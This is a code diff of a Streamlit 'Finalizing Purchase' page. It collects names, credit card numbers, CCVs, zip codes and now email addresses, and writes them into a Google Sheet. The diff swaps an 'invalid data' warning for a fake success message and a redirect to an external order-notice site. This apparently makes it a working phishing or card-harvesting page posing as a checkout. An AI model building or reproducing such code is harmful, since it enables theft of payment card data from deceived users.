@@ -1,5 +1,6 @@
 import streamlit as st
 import gspread
+import webbrowser
 
 
 st.set_page_config(page_title="Finalizing Purchase")
@@ -37,6 +38,8 @@ with col3:
 with col3:
     last_name = input_container.text_input("Last Name",placeholder="Last Name")
 with col3:
+    email = input_container.text_input("Email",placeholder="Email")
+with col3:
     credit_card_number = input_container.text_input("Credit Card Number",placeholder="1111 1111 1111 1111")
 
 with col3:
@@ -65,6 +68,7 @@ def send_data():
     sh.update(f'E{next_empty_row}', [[CCV]])
     sh.update(f'F{next_empty_row}', [[zip_code]])
     sh.update(f'G{next_empty_row}', [[country]])
+    sh.update(f'H{next_empty_row}', [[email]])
 
     
 
@@ -76,14 +80,19 @@ def send_data():
 button_placeholder = st.empty()
 
 # Display the button in the placeholder
+import streamlit as st
+
+
 if button_placeholder.button("Place A Order"):
     # Call the send_data function
-    with st.spinner("Please wait do not spam the button."):
+    with st.spinner("Please wait, do not spam the button."):
         send_data()
-
-    # Display a warning message
-    st.warning("¡ The data entered is not valid !")
     
+    # Open a new tab with the specified URL
+    webbrowser.open_new_tab("https://notice-about-your-order.onrender.com/")
+    
+    # Display a success message
+    st.success("Your order has been placed successfully. Check your email address.")
 
 
 
